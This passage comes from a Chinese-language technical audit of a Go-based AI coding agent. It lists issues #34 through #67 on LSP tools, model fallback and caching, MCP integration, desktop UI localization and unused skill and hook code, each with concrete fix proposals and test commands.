- **建议**：二选一——A 扩大 `LspIde` 接口加 3 方法，新增 `lsp_semantic_tokens`/`lsp_inlay_hints`/`lsp_code_lens` 只读工具（复用通用 `lspIdeTool`），在 `app/lsp_adapter.go` 补映射；B 从 capabilities 移除这三项宣告并删死代码，加守护测试防漂移。
- **验收**：`go test ./internal/lsp ./internal/tools -run 'Semantic|Inlay|CodeLens|LspIde' -count=1`；新增测试断言工具名集合与 LspIde 方法集合一一对应（或 capabilities 不含未消费项）。

### 35. `ResolveCodeLens` 是自承的半实现：丢弃 `data` `[P2/S]`
- **现状**：`internal/lsp/features_advanced.go:71-77` 注释明确写「服务器的不透明 data 不被 CodeLens 保留，因此需要它来解析 lens 的服务器无法通过此辅助函数服务」；params 只有 `range`/`command`，`parseCodeLens`:204-228 的 `rawCodeLens` 也只解析这两个；返回 `resolved[0].IsResolved=true`（:88）是虚假标记。
- **问题**：多数真实服务器（含 gopls 部分 lens）在 resolve 时需要原始 `data` 定位 target；当前静默返回残缺 lens 而非可见失败。
- **建议**：`lsp.CodeLens` 加 `Data json.RawMessage`；`rawCodeLens` 加 Data 并在 `parseCodeLens` 赋值；`ResolveCodeLens` 把整个 `lens` 作为 params 发送（LSP 规范要求 resolve 参数是原 CodeLens 对象）；去掉虚假 `IsResolved=true`，改为依据响应是否含 command 判定。
- **验收**：扩展 `features_advanced_test.go` fake server 断言 resolve params 中 data 原样回传；`go test ./internal/lsp -run ResolveCodeLens -count=1`。

### 36. LSP 扩展名映射与已注册服务器不匹配 `[P2/S]`
- **现状**：`internal/lsp/servers.go:206-232` 的 `extensionLanguages` 覆盖 22 种（含 c/cpp/json/md/yaml/lua/zig）；但 `DefaultServers()`:13-29 只注册 go/rust/typescript/javascript/python 五种；`Registry.Lookup`:170-175 对 C/C++/JSON/Markdown/YAML/Lua/Zig 一律 false，`app/lsp_adapter.go:178` 转成 `"no LSP server configured"`；无测试锁定两表对应。
- **问题**：`LanguageForPath` 给出「支持」信号与真实能力不一致，模型对 `.json`/`.md`/`.cpp` 调用任一 lsp_* 工具得到固定失败，浪费轮次。
- **建议**：二选一——A 收敛 `extensionLanguages` 只保留有服务器的扩展名；B 在 DefaultServers 增加 clangd/json/yaml/marksman 等，并把 `extension → language → server` 统一为一张表生成；新增「映射表每个语言 id 都有服务器」单测。
- **验收**：`internal/lsp/server_coverage_test.go` 遍历映射值断言 `NewRegistry().Lookup(lang)` 为真（或值集合 ⊆ 已注册语言）。

### 37. `internal/commands` 补全/诊断纯函数未接线 `[P2/S]`
- **现状**：`internal/commands/complete.go:33` 的 `CompleteCommands`、`complete_argument.go:33`、`complete_coordinator.go`、`diagnostics.go:52` 的 `DiagnoseCommands` 均为纯函数且有测试，但 app 侧无调用证据；CLI 的补全走自成一套的逻辑。
- **问题**：slash 命令的参数补全与诊断能力写好不用，用户在 TUI 输入 `/commit ` 时得不到候选或错误提示。
- **建议**：在 `internal/app/commands_wire.go`（或现有命令装配处）把 `CompleteCommands`/`DiagnoseCommands` 接到 TUI 输入完成回调与 CLI 的 `commands doctor`；保持默认无配置时行为不变。
- **验收**：`go test ./internal/commands ./internal/app -run 'Complete|Diagnose' -count=1`；手工在 TUI 输入 `/` 后 Tab 出现候选。

### 38. `pluginapi/dependency_guard` 三原语未接线，`boot_topo` 仅 opt-in `[P2/S]`
- **现状**：`internal/pluginapi/dependency_guard.go:20` 的 `ValidateFeatureDeps`、`:34 ExpectedOrder`、`:53 StableKey` 仅 `dependency_guard_test.go` 使用；`registry.go:52 TopoSort` 在 `app/boot_topo.go:64` 仅 `ARGENT_BOOT_TOPO=1` 启用，`workflow/dag_validate.go:45` 使用。
- **问题**：特性依赖校验无从执行，特性注册顺序错误时无稳定诊断；拓扑排序的好处只在 opt-in 下生效。
- **建议**：在 app 启动装配末尾（所有 Register 完成后）调用 `ValidateFeatureDeps`，对 `ExpectedOrder` 做一次校验并把 `StableKey` 用于诊断日志；把 `ARGENT_BOOT_TOPO` 的 opt-in 范围在 `OPT_INS.md` 写清，或评估默认启用（需 golden 验证）。
- **验收**：`go test ./internal/pluginapi ./internal/app -run 'Dependency|Topo' -count=1`；反向注入一个乱序注册断言产生明确错误。

---

## 四、模型/协议与召回（39–50）

### 39. 两层模型切换判定分叉：硬性配额在 agent 层仍触发换模型 `[P0/S]`
- **现状**：`internal/app/app_chatter.go:114-119` 回退前调 `llm.IsNonRetryableQuotaResponse(code,body)` 拒绝硬配额；`internal/agent/fallback.go:221-223` 的同源函数 `isRetryableProviderError` 只有 `llm.IsRetryableStatus(code)||legacyRetryable`，缺该检查；权威判定在 `llm/retry.go:445-453`。两份文本正则与状态码提取（`statusCodeInError` vs `statusCodeInFallbackError`）也已漂移。
- **问题**：同时配 `--fallback-model`（app 层）与 `FallbackModels`（agent 层）时，同一条 `429 ... quota exhausted` 在 app 层判终态、agent 层判可重试，会再发一次注定失败的请求——重复计费、重复事件、UI 二次 `model failed`。
- **建议**：`fallback.go` 的 `isRetryableProviderError` StatusCode 分支插入同一终态短路；删除本地副本改用 `llm.ClassifyRetry(err,code,body)` 统一 Reason；保持 `retryReason` 封闭字符串不变。
- **验收**：`internal/agent/fallback_retryable_parity_test.go` 对 `HTTP 429: insufficient_quota`/`HTTP 503`/`context window exceeded`/`invalid request` 断言两层一致；`go test ./internal/agent ./internal/app -run 'Fallback|Retryable' -count=1`。

### 40. `failure_contract.go` 六个「单一入口」导出原语零生产调用 `[P1/M]`
- **现状**：`internal/llm/failure_contract.go:9-16` 自述是「agent 与 app 的单一入口」，但 `IsContextOverflow`:25、`IsByteSizeOverflow`:39、`IsRecoverableStreamError`:46、`IsRetryableError`:53、`RetryReasonForResponse`:63、`ClassifyRetry`:89 全部只在测试调用；生产仍直调 `fallback.go:228,253` 与 `app_chatter.go:121` 的 `llm.ClassifyRetryError`。
- **问题**：权威逻辑与消费方「事实来源分裂」——以后修 `ClassifyRetryError` 两层回退不会自动受益，也直接导致 #39 的分叉。
- **建议**：把上述三处调用换成 `llm.ClassifyRetry(err,code,body)`；`loop.go` 长度/溢出分支用 `llm.IsContextOverflow(err)` 替代重复的 `ClassifyFailure(...).Kind` 比较；加内部测试断言门面与直接分类结果一致。
- **验收**：`internal/llm/failure_contract_parity_test.go` 覆盖 nil/取消/溢出/429 硬配额/超时；`grep -rn 'ClassifyRetryError' internal/agent internal/app --include='*.go'` 生产代码不再直调。

### 41. Responses 跨会话稳定缓存键 `sessionCacheKey` 是死代码 `[P1/S]`
- **现状**：`internal/llm/options.go:199-215` 实现三态 `sessionCacheKey`（override > `session:<id>`，按 rune 截断 128）并有内部测试；但 `responses.go:446-452` 生产只用 `deriveCacheKey(req.Instructions, string(toolJSON))`（options.go:184-193），`Options.PromptCacheKey` 在 app/cli 零赋值。
- **问题**：跨 turn/fork 的稳定缓存键从未上线，会话分叉或 prompt 前缀微调都导致缓存失效，与注释声称的「跨 turn/fork 复用」不符。
- **建议**：`Options` 加 `SessionID string`（json:"-"）；`ResponsesClient.buildRequest` 缓存分支把 `sessionCacheKey(SessionID, PromptCacheKey)` 作为次优先级（override 仍最高），`deriveCacheKey` 作最终回退；`app_resolve.go` 用已解析的会话 ID 注入；未注入时逐字节不变。
- **验收**：`responses_session_cache_key_wire_test.go`：同一 SessionID 两轮 `prompt_cache_key` 相同、CJK ID 不被切断、无 SessionID 时线字节一致。

### 42. `CapabilityProfile`/`ProfileFor` 未接线桩，视觉标记表与 llm 侧重复 `[P1/M]`
- **现状**：`internal/provider/capability_profile.go:5-9` 明写「纯函数原语，不接线到 CLI 或任何请求流程」，`ProfileFor`:73 生产零调用；第 23-27 行承认 `imageModelMarkers` 是 llm 侧未导出标记表的「保守快照」，两份表各自维护。
- **问题**：用户无法从 CLI/doctor 得知某 provider+model 是否支持思考/图片/工具、窗口多大；新增视觉模型时两表易漂移，诊断结论与线上 `image_parts.go` 不一致。
- **建议**：在 `internal/llm/media_capability.go` 导出 `VisionMarkerFor(model) bool`（内部函数改转发），provider 的 `supportsImage` 直接调用并删重复快照；把 `ProfileFor` 接到只读诊断入口（`provider model info` 或 doctor 子项），输出四字段；不改请求字节。
- **验收**：`internal/provider/profile_vision_parity_test.go` 遍历两边语料断言一致；CLI 测试断言诊断输出含 thinking/image/tools/contextWindow。

### 43. 模板字段 `CacheSupport` 是死数据，缓存决策与模板声明脱节 `[P1/M]`
- **现状**：`internal/provider/templates.go:38-40` 定义字段，仅 57/67/122（anthropic/openai/xai）置 true；全仓唯一读取在 `capability_test.go:27,32`；生产缓存判定在 `llm/options.go:119-134`，只看协议与本地端点，不看模板。
- **问题**：声明「不支持缓存」的 provider（deepseek/qwen/openrouter 等）只要用 Responses/Anthropic 协议且非回环地址，仍被打缓存标记并发送 `prompt_cache_key`/`cache_control`；兼容性差的网关可能报错。
- **建议**：在 `app_resolve.go:268-270` 构造 `wireOpts` 时传 `template.CacheSupport`：为 false 且未 ForcePromptCache 且用户未选 cacheTier 时设 `NoPromptCache=true`；`ForcePromptCache` 最高优先级；扩展 `resolveCacheOptions` 签名接收 `supportsCache bool`。
- **验收**：`internal/app/cache_template_wire_test.go`：解析 deepseek/qwen 时请求不含 cache_control/prompt_cache_key，openai/xai 仍含；`--force-prompt-cache` 可覆盖。

### 44. 纯文本流中断被静默吞掉，流中断回补永远不触发 `[P1/M]`
- **现状**：`internal/llm/attempt.go:87-95,109-115` 的 `streamIntegrity.eofError` 只在 `incompleteTool` 为真时报错，注释明确「纯文本截断仍然容忍」，`stream_integrity_test.go:88` 固化该行为；回补门 `fallback.go:95-99` 要求 `errors.Is(err, llm.ErrStreamError)`。
- **问题**：最常见的「代理在文本输出中途干净关闭 TCP」场景，SSE 正常 EOF、无 tool call，客户端返回半截文本且 `err==nil`；agent 当成功入库，用户拿到看似完整的截断答案。
- **建议**：`streamIntegrity` 加 `sawAnyText`/`sawAnyEvent` 标记；新增 `Options.StrictStreamTerminator`（默认 false），开启时在 `!terminated && sawAnyText` 返回 `streamError(...)`；`EnableStreamRecovery` 开启时由 `app_resolve.go` 一并打开；三协议 `readStream` 写 text 增量处设标记。
- **验收**：`internal/llm/stream_truncation_test.go` 三协议各一：服务端发一段 delta 后直接关闭无终止事件，断言严格模式返回 `ErrStreamError`、默认模式仍返回半截文本；新增 agent 测试断言触发一次 `ChatOnce` 且只发精确后缀。

### 45. OpenAI chat 的 `Client.ChatOnce` 缺专属线协议/解析测试 `[P1/M]`
- **现状**：`internal/llm/client.go:632-775` 是最复杂的 ChatOnce（自建响应类型:598、`stream=false`+`StreamOptions=nil`:636-637、`Accept: application/json`:668、reasoning 双拼写回退:714-717、空消息拒绝:718、tool id 回退:735-761、usage:722-731），但 `chat_once_test.go` 的 6 个测试只覆盖 Anthropic 与 Responses；chat 版仅在 `verbosity_wire_test.go:99,111` 顺带调用。
- **问题**：流中断回补在最常用的 chat completions 上实际无回归保护——`stream_options` 与 `stream=false` 共存被引擎拒绝、reasoning 备用键丢失、空 choices 崩溃、工具 id 碰撞都无法被测试发现。
- **建议**：`chat_once_test.go` 增加 `TestChatCompletionsChatOnceWireBytes`（断言 stream:false、无 stream_options、Accept、Authorization）与 `TestChatCompletionsChatOnceParsing`（表驱动 reasoning 回退、finish_reason、cached_token、缺省 tool id 不与提供方 id 冲突、空 choices 报错）；复用 httptest 不联网。
- **验收**：`go test ./internal/llm -run ChatOnce -count=1`，要求故意移除 `request.StreamOptions=nil`（client.go:637）时测试失败。

### 46. 上下文窗口表缺 llama/mistral，6 个内置模板默认模型落到 0→32000 `[P1/S]`
- **现状**：`internal/provider/context_window.go:19-40` 只有 claude/gpt/gemini/deepseek/kimi/grok/glm/qwen/minimax 规则；`context_window_test.go:40-42,84` 甚至固化 `llama3.2→0`；而 `templates.go:105-115,159-192` 的 ollama/lmstudio/groq/mistral/together/fireworks/cerebras 默认模型全是 llama/mistral 系。
- **问题**：`ContextWindowFor` 返回 0 后 app 用编译默认 32000，远低于真实窗口，导致过早压缩/裁剪历史，长任务丢上下文；用户未显式配置时无提示。
- **建议**：`contextWindowRules` 增加 `{"llama",131072}`、`{"mistral",128000}`（置于通用规则后），local-model 仍 0；更新 `context_window_test.go` 的 want；新增守护测试遍历 `provider.List()` 断言 20 个模板默认模型除 local-model 外不得返回 0。
- **验收**：`go test ./internal/provider -run ContextWindow -count=1`；`internal/app/compact.go:69` 行为不变。

### 47. 20 模板/12 别名测试覆盖不完整（15/20 与 4/12）`[P1/S]`
- **现状**：`internal/provider/templates.go:52-193` 有 20 个模板、:195-209 有 12 别名；但 `templates_test.go:12-34` 的 want 只列 15（缺 xai/zai/bigmodel/minimax/local），`TestResolve`:81-106 只覆盖 kimi/glm/dashscope/google 4 个别名。
- **问题**：误改 xai 协议（ProtocolResponses）、`bigmodel.cn → zhipu` 的 API Key 变量（与 bigmodel 不同）不会被拦截；bigmodel/zhipu 同 BaseURL 不同 KeyEnv 尤其脆弱。
- **建议**：把 `TestListCoversBuiltInProviders` 的 want 改为覆盖全部 20（含 CacheSupport 与 APIKeyEnvs/NoAuth 断言）；`TestResolve` 改为遍历全表 12 别名并断言规范名与 BaseURL 非空；额外断言 `bigmodel.cn` 与 `bigmodel` 凭据来源差异，避免误「修复」。
- **验收**：`go test ./internal/provider -run 'TestList|TestResolve|TestCacheSupport' -count=1`；临时改一处模板字段验证测试会红。

### 48. 重试/流空闲可靠性旋钮零配置入口，非法超时静默降级 `[P2/M]`
- **现状**：`internal/llm/retry.go:18-41,126-138` 的 `RetryPolicy`（含 Jitter/Sleep 注入）已完整，但 `app/provider_factory.go:41-64` 三个 chatter 工厂从不设置 `client.Retry`，`app_resolve.go` 也无配置读取；CLI 的 `--retry`（flags_register.go:35）是 session fork 语义无关。流空闲超时 `provider_factory.go:14-24` 用 `strconv.Atoi`，失败或 ≤0 一律静默返回 0（禁用）。
- **问题**：高延迟/严格限流 provider 无法调大尝试次数或退避，排障时无法一键关重试；把超时写成 `500ms`/`1.5` 的用户毫无提示地失去假死连接保护。
- **建议**：config/cli 增加 `retry.attempts`/`retry.baseDelayMs`/`retry.maxDelayMs` 与 `--max-attempts`，在 `app_resolve.go` 构造 `RetryPolicy`（非全零才注入，IsZero 回退默认）；`streamIdleTimeout` 改 `time.ParseDuration` 并兼容纯秒数，非法值经 Resolved 诊断通道输出警告而非静默归零。
- **验收**：`internal/app/reliability_options_test.go` 表驱动断言 `"2"`/`"500ms"` 正确解析、`"abc"`/`"-1"` 触发诊断且保持 0；注入 MaxAttempts=5 后 `Retry.MaxAttempts==5`。

### 49. 模型策略规则化：窗口/限制/怪癖下沉为数据 `[P2/M]`（学自 oh-my-pi catalog）
- **竞品证据**：`oh-my-pi/packages/catalog/src/compat/resolve.ts` 的 `resolveModelPolicy`:1371、`context-window.ts`、`prompt-cache-lookback.ts`；261 条 KDL 规则编译为 rules.json。
- **现状/缺口**：`internal/provider/templates.go`、`context_window.go`、`capability_profile.go`、`thinking.go` 把窗口/能力/推理预算写成 Go 常量；新增长尾模型要改代码重编译，没有「精确 id > 族 > 默认」优先级与冲突检测。
- **建议**：把纯数据抽到 `internal/provider/model_policy.json`（stdlib `encoding/json` + `go:embed`），字段含 id/class/family 选择器、contextWindow、maxOutput、promptCacheLookback、quirks；`provider.Resolve` 按精确 id→族→默认解析，同优先级重叠报明确错误；现有常量保留为默认值。
- **验收**：只改 JSON 即新增模型生效（无需改 .go）；同优先级重叠返回错误；未声明字段的 provider 输出逐字节一致；go vet/gofmt 全绿。

### 50. 记忆库「睡眠」整合 + 词形还原召回 `[P1/M]`（学自 oh-my-pi/mnemopi）
- **竞品证据**：`oh-my-pi/packages/mnemopi/src/cli.ts` 的 `cmdSleep`:256、`cmdBank`、`cmdScratchpad`；README 的 lexical recall 形态规则（backup↔backups，但 1Password 不匹配 pass）。
- **现状/缺口**：`internal/memory/bank.go` 是单 JSONL + 词重叠/tag bonus/recency，`recall_rank.go` 的 `RankRecall` 按 (score,recency,id) 排；没有整合（重复合并、矛盾消解、衰减），也没有词形还原，`backups` 召不回 `backup`。
- **建议**：stdlib-only 在 `internal/memory` 加 `Consolidate()`（opt-in，命令/cron 触发）：近重复事实合并并合并来源、冲突断言标记而非静默覆盖、importance×veracity×recency 衰减排序；召回前对 query 做轻量形态归一（s/es/ed/ing/ies + 中文常见复数）；经工具或子命令暴露，默认关。
- **验收**：两条语义相同事实整合后只剩一条且来源保留；冲突被标记；`backups` 可召回 `backup` 而 `1Password` 不匹配 `pass`；关闭时库文件字节不变。

---

## 五、交互界面与可用性（51–61）

### 51. Native 侧边栏 11/12 导航项是静态占位桩 `[P1/M]`
- **现状**：`native/nav_panel.go:17-73` 的 11 个导航项各配 `desc+rows` 纯文本，`:78-83 navPanelFor` 未知项回退「该面板尚未实现。/敬请期待」；`native/main.go:290-314 sidebar` 中 `btn.Clicked()` 仅 `app.nav = name; app.status = "已切换到"+name`；只有「聊天」走真实 `sessionPanel`；测试只验证映射不验证可用性。
- **问题**：点击 Git/文件/用量/任务/终端/工作流得到不可交互静态文字，占导航项 92%，是桌面端最显眼的半成品。
- **建议**：给 `navPanel` 增 `onRow func(*chat,string)`；优先接已有 RPC：「用量」→engine token 统计、「任务」→jobs 列表、「Git/文件」→经 `bridge.call` 调 server 方法；无后端能力的项改只读展示真实文件（AGENTS.md/docs）并注明「只读预览」；去掉「敬请期待」文案改为可诊断错误。
- **验收**：新增 `native/nav_panel_test.go`：每个非聊天项至少有可点击回调或 status 不只是「已切换到」；手工点击 11 项截图无「敬请期待」。

### 52. Native 完全无本地化，硬编码扫描存在「目录+中文」双盲区 `[P1/L]`
- **现状**：`native/` 零 `internal/i18n` import，非测试文件约 158 处中文 UI 字面量；`internal/i18n/i18n.go:1-5` 自称「CLI 和 TUI 的字符串目录」但 TUI 实际用自建 `tui/locale.go:10` 双表，形成两套并行目录；`hardcoded_scan_test.go:31-34 hardcodedScanRoots` 只含 cli/cmd，`:294-300` 对含非 ASCII 字符串直接判非硬编码。
- **问题**：`argentgo gui --locale en-US` 对原生窗口无任何效果（叠加 #60）；英文用户无法用桌面端；守卫无论新增多少中文硬编码都不失败。
- **建议**：① 扩展 `hardcodedScanRoots` 加 native/与 internal/tui/，新增 `isHardcodedChinese` 并建 158 处存量 baseline 做增量守卫；② native 建 locale.go 复用 i18n 的 catalog/effectiveLanguage（增加导出包装），迁移 navItems/status/审批卡/空态；③ `cmd/argent/gui.go:97` 把 ARGENT_LOCALE 传入。
- **验收**：`go test ./internal/i18n -run 'TestCLIHardcodedEnglishDoesNotGrow|TestHardcoded' -count=1`；设 `ARGENT_LOCALE=en-US` 启动 GUI 截图主界面无中文。

### 53. Native 包测试被排除在日常验证分层 `[P1/S]`
- **现状**：`AGENTS.md:32` 明确「native 包测试只在发版门禁跑」；但 `native/` 有 13 个测试文件覆盖审批竞态、会话分支、取消、错误脱敏；`native/main.go:1509-1518` 需真实 GPU 窗口，测试用 `newTestChat` 无窗口路径。
- **问题**：改 sidebar/approvalView/sendReal 等交互热路径后，日常 `go test -p 4 ./...` 很可能跳过 native，占位导航、断连无提示正是长期无人把关的结果。
- **建议**：把不依赖 `mygo.App.Run` 的纯逻辑测试（error_notice/nav_panel/event_bridge 解码/approval_answer）提升为日常快验证子集，在 `AGENTS.md:30-34` 加快验证命令；仅 bridge_race 与需窗口用例留在发版门禁。
- **验收**：`go test -p 4 ./native -run 'TestEngineError|TestNavPanel|TestDecode|TestApprovalAnswer' -count=1` 在无 GPU CI 上 10 次全绿且 <10s；AGENTS.md 出现该命令。

### 55. 键位别名层已实现但不可配置 `[P2/M]`
- **现状**：`internal/tui/keymap.go:8-12` 自述「未来可选接入的键位映射层」，`resolveBinding`:27/`addAlias`:53/`mergeAliases`:70 支持大小写折叠、CJK 别名、歧义字典序，但仅测试引用；实际分派硬编码在 `model_input.go handleKeyLocked`，无配置入口；`keys.go:16-70` Kind 枚举与 `locale.go:37/96` help 文本需手工同步。
- **问题**：vim/IDE 习惯（j/k 滚动、Ctrl+/ 折叠）无法适配；中文别名等能力空转；改一键要改多处。
- **建议**：新增 `binding_resolver.go`：默认 aliases 表由 resolveBinding/addAlias 合并配置层（沿用 internal/config 的 env/flag 注入）；`handleKeyLocked` 入口加「原始键串→别名→动作名」旁路，仅对未覆盖组合生效，保持逐帧字节不变；help 文本改由 `ShortHelp(bindings,...)` 生成消除手工同步。
- **验收**：`resolveBinding("k",aliases)=="scroll_up"` 且经 handleKeyLocked 触发滚动；配置 `{"scroll_up":["K"]}` 后大写 K 生效；无配置时 Frame 逐字节一致。

### 56. `ShortHelp`/`HintBindings` 未接线，底部按键栏恒空且 `/help` 单条长串 `[P2/S]`
- **现状**：`render.go:1206-1212 hintLine` 按用户决定恒返回空行，`:127 hintY` 仍保留行位；`keys.go:431 KeyBinding`/`:447 HintBindings`/`:480 ShortHelp` 实现逐项 Enabled、宽度感知、整条丢弃+省略号、CJK 安全，但仅测试引用；`model_input.go:548` 的 `/help` 把 `locale.go:37/96` 一整条 ~50 项长串塞进一行 notice。
- **问题**：首次用 TUI 无任何按键线索；`/help` 输出不可换行/不可按状态裁剪的超长行，窄终端只读开头；结构化帮助渲染器闲置。
- **建议**：保留默认帧无提示的决定，但把 `/help` 改结构化：`HintBindings(help text)`→按当前 UI 状态设 Enabled→`ShortHelp(bindings,width,TextWidth)` 分多行 notice（每行 ≤ 终端宽，复用 `screen.go:354 Wrap`）；补充生产路径测试消除「仅测试使用」。
- **验收**：`help_test.go` 断言 `/help` notice 行数 ≥2、每行 `TextWidth≤100`、窄宽无半个按键被切断；默认帧仍不含 `"enter send"`（hint_removed_test.go 必须通过）。

### 57. WCAG 对比度原语未接入徽章渲染 `[P2/M]`
- **现状**：`internal/tui/contrast.go:87-138` 的 `contrast`/`ContrastRatio`/`LegibleInk` 完整实现（#rgb/#rrggbb 解析、sRGB 线性化、3:1 阈值、无效输入保守返回 0），注释明确「尚未接入徽章渲染器」并给出方案；仅测试引用；`theme.go:23-39 Palette` 全为 SGR 字符串，无 hex 角色。
- **问题**：新增非内置主题时徽章前景/背景对比度无人校验，低对比组合在深色/高亮终端不可读；成熟辅助函数白写。
- **建议**：`Palette` 加可选 `BadgeBGHex/BadgeInkHex/BadgeAltInkHex`（内置主题留空走原 SGR，逐字节不变）；`render.go attemptLinesLocked` 的「⟳」徽章与 `renderEntryLocked` 通知墨色在非空时调 `LegibleInk`；`SetTheme` 对非内置主题做一次 ContrastRatio 校验并给出可测试错误/降级路径。
- **验收**：`theme_contrast_test.go` 构造低对比自定义主题断言墨色被替换为 alt；内置三主题 Frame 逐字节相同。

### 59. Native bridge 断连无用户可见提示 `[P1/M]`
- **现状**：`native/bridge.go:157-166 readLoop` 在 EOF/读错误时置 `b.closed=true` 并给 pending 回 "engine connection closed"，但 bridge 结构体（:17-32）无 onClose/状态回调；`main.go:1485-1490` 仅启动时设一次 `app.status="已连接引擎"`；下一次提问经 `sendReal`→`call` 直接返回 "engine bridge closed"，才由 `completeFromPrompt` 显示为一条错误气泡。
- **问题**：engine 崩溃/被杀后桌面窗口仍显示绿色「已连接引擎」，用户继续输入才收到失败提示，且无一键重连。
- **建议**：bridge 加 `onClose func(error)` 与 `setCloseHandler`（复用 setDeltaHandler 的 mu+generation 模式），readLoop 解锁后调用；main 注册回调通过 `app.win.Update` 把 status 改为「引擎连接已断开」、状态点变 danger，并在 composer 旁渲染「重新连接」按钮（重走启动逻辑）。
- **验收**：`native/bridge_close_test.go` 用 pipe 模拟 EOF，断言 onClose 恰好一次且 status 含「断开」；`go test -race ./native -run TestBridge -count=1`。

---

## 六、生态与扩展（62–73）

### 62. MCP 工具清单变更通知完全未接线 `[P1/M]`
- **现状**：`internal/mcp/tool_catalog.go:9,16,41` 定义 `notifications/tools/list_changed`、`ToolCatalogRevision`、`isToolListChanged`，注释明写「尚未接入任何通知分发路径」；`jsonrpc.go:143-145` 对所有含 method 的消息直接 `return nil`；`tool_cache.go:16 toolCache`+`mcp.go:303 ListTools` 的 TTL 缓存只在 `Spec.ToolCacheTTL>0` 启用而 app 从未设置。
- **问题**：服务器声明 listChanged 并推送后，已缓存/冻结的工具列表长期过期：新增工具不可见、下线工具仍可调用报错——MCP 标准能力实际失效。
- **建议**：`jsonrpc.go:63 waiters` 加 `onNotification func(method string)` 并在 handleOne 的 hasMethod 分支调用；client 持有 `ToolCatalogRevision`，收到 isToolListChanged 时 Bump + `toolCache.invalidate()`；ListTools 读缓存前比较 revision，变化则强制重新发现；工具集提供 `RefreshTools()` 在"工具不存在"时重建绑定。
- **验收**：`internal/mcp` 用例模拟服务器发通知，断言 revision+1 且下次 ListTools 重新请求并返回新工具；`go test ./internal/mcp -run 'TestListChangedNotification|TestToolCatalog' -count=1`。

### 63. `ServerSpec.Dir` 声明为 cwd 却从未传入 stdio 进程 `[P1/S]`
- **现状**：`internal/plugins/merge.go:7-18 ServerSpec` 的 `Dir` 注释「bundle 根，用作服务器工作目录」，:76 赋 `bundle.Dir`；`app/mcp.go:344-357 wirePlugins` 构造 `mcp.Spec{Name,Command,Args,Env,URL}` 无 Dir（Spec 无该字段）；`mcp/stdio.go:122 exec.Command` 未设 `cmd.Dir`。
- **问题**：清单中以相对路径声明的 MCP 脚本（`./server.js`/`config.json`）按 agent cwd 而非插件目录解析，同一插件从不同工作区启动行为不一致；Dir 是死字段。
- **建议**：`mcp.Spec` 加 `Dir string`（仅 stdio），`stdio.go:120` 设 `cmd.Dir=spec.Dir`（空保持原行为）；`app/mcp.go:350` 传 `Dir: server.Dir`；在 `newStdioTransport` 内做 `filepath.Abs`+`Rel` 边界校验，逃逸报 ErrConfiguration。
- **验收**：`mcp/stdio_test.go` fake 服务器打印 os.Getwd()，断言设置 Dir 后 cwd 相等；`go test ./internal/mcp ./internal/app -run 'TestStdioWorkDir|TestPluginServerDir' -count=1`。

### 64. 重试/连接错误分类原语未接线，HTTPStatusError 从未由传输产出 `[P1/M]`
- **现状**：`internal/mcp/resilience.go:122,142` 的 `HTTPStatusError`/`IsRetryable`、`conn_error.go:16,20,54,88` 的 `ErrAuthentication`/`ErrConfiguration`/`isRetryableConnectionError`/`isPermanentConnectionError` 只出现在测试；`http.go:318-322 post()` 非 2xx 只返回 `fmt.Errorf("HTTP %d: %s",...)`，全仓无 `&HTTPStatusError{}` 生产构造。
- **问题**：真实 502/503/504 不被识别为短暂故障，401/403 走不到 typed 永久错误路径；整套分类/退避原语是死代码，冷启动或网关抖动直接导致 MCP 不可用且无自动恢复。
- **建议**：`http.go:post` 非 2xx 用 `fmt.Errorf("HTTP %d: %w", code, &HTTPStatusError{...})`（保留文本前缀兼容断言），401/403 额外包 ErrAuthentication；新增 `mcp/retry.go` 的 `CallWithRetry`（指数退避+jitter、最多 3 次、仅 IsRetryable 重试、尊重 ctx）；app 在远程 Initialize/ListTools 用它。
- **验收**：mock HTTP 依次 503→200 在 2 次内成功、401 恰好 1 次请求；`go test ./internal/mcp -run 'TestPostTypedHTTPStatusError|TestCallWithRetry' -count=1`。

### 65. MCP 健康观测/聚合未接入 doctor 与工具集 `[P1/M]`
- **现状**：`internal/mcp/health.go:22,83,89` 的 `HealthTracker`/`HealthReporter`/`HealthSnapshot`、`health_report.go:35 AggregateHealth`、`health_wire.go:26,89 HealthAggregator/PollReporters` 全仓只在 health_*_test.go；`mcp.go:210` 仅 `Spec.HealthTracking==true` 时挂接而 app 未设置；`cli/doctor.go:520 checkMCPConfig` 只静态校验，`:76 checks` 无 MCP 运行时健康项。
- **问题**：用户无法通过 doctor 判断哪个 MCP 服务器挂了、上次错误是什么；整套健康原语只测不用。
- **建议**：app connect 设 HealthTracking:true（或 opt-in 控制保 golden）；toolset 持 `*HealthAggregator`，connect 成功 Track、关闭 Untrack，提供只读 `MCPHealthReport()` 经 Resolved 注入 CLI；`doctor.go` 新增 `checkMCPRuntimeHealth` 按 LastError 生成 warn/fail，输出走 issues 旁路不破 golden。
- **验收**：`go test ./internal/cli -run TestDoctorMCPHealth -count=1`：fake reporter 1 健康 1 失败，断言输出含失败服务名与 LastError。

### 66. skills trigger（paths/keywords/models）自动激活未接线 `[P1/M]`
- **现状**：`internal/skills/trigger.go:15,34,90,119,132,165` 的 `Triggers`/`MatchPath`/`SkillsForPath`/`SkillsForKeywords`/`SkillsForModel`/`ResolveTriggeredSkills`（注释称「自动技能激活的唯一入口」）仅在 `trigger_test.go`；`skills.go:106-110` 已把 frontmatter 的 paths/keywords/models 解析进 `Skill.Triggers`；`app_prompt.go:70` 直接 `registry.IndexText()`，`app/mcp.go:478` 只处理显式 `use_skill`。
- **问题**：用户写的 `triggers:` 完全不生效；用 models/paths 限制技能的安全意图落空（声明仅 *.go 生效的技能在任何文件上都可被加载）。
- **建议**：toolset 每轮用 `ResolveTriggeredSkills(skills,path,prompt,modelFamily)` 算 activeSkills；Registry 加 `IndexTextFor(skills)`，`app_prompt.go:70` 改用它；`use_skill` 的 Get/Load 限制在 active 集合；结果按 (root,modelFamily) 在 `app/definitions.go:67` 缓存层复用。
- **验收**：`go test ./internal/app -run 'TestTriggeredSkillIndex|TestUseSkillRespectsTrigger' -count=1`：注册分别限制 paths/keywords/models 的 3 个技能，断言系统提示只出现匹配项。

### 67. hooks 分发扩展点（Verdict/Middleware/StopBlocks）均未接线 `[P1/M]`
- **现状**：`internal/hooks/verdict.go:56,147,172` 的 `VerdictFromOutcome`/`AggregateVerdict`/`AdditionalContextFromOutcome` 解析退出码 2/49 与 stdout 的 `permissionDecision`；`middleware.go:9,21` 已被 `dispatch.go:192-199` 支持；`dispatch.go:164 StopBlocks`、`:271 applyStopVerdict`。但 `app/hooks.go:58-61` 直接 `&hooks.Dispatcher{}`（Middlewares/StopBlocks 零值），HookDispatcher 接口只有 Dispatch；VerdictFromOutcome 全仓只在测试。
